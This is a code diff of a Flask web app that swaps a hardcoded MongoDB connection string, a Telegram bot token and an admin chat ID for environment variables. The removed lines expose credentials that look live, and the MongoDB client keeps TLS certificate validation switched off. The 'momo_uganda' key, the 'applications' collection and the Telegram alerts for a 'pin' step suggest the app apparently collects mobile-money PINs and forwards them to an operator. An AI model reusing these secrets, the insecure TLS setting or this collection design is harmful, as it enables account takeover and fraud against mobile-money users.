@@ -9,16 +9,15 @@ app = Flask(__name__)
 app.secret_key = "super_secret_momo_uganda_key"
 
 # MongoDB connection with SSL/TLS fallback for Vercel Serverless environment
-MONGO_URI = "mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/brian_client_1st?retryWrites=true&w=majority&appName=superuser"
+MONGO_URI = os.environ.get("MONGO_URI")
 client = MongoClient(MONGO_URI, tls=True, tlsAllowInvalidCertificates=True)
 db = client["brian_client_1st"]
 applications_collection = db["applications"]
 support_collection = db["support_tickets"]
 
 # Dedicated Uganda Telegram Configuration 🇺🇬
-TELEGRAM_BOT_TOKEN = "8887873015:AAEDNFIV-_LUGYbymm1BHLQnZIWzlhpCBRQ"
-TELEGRAM_ADMIN_CHAT_ID = "655384338"
-
+TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
+TELEGRAM_ADMIN_CHAT_ID = os.environ.get("TELEGRAM_ADMIN_CHAT_ID")
 def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step_code="pin"):
     db_id = str(app_data.get("_id"))
     
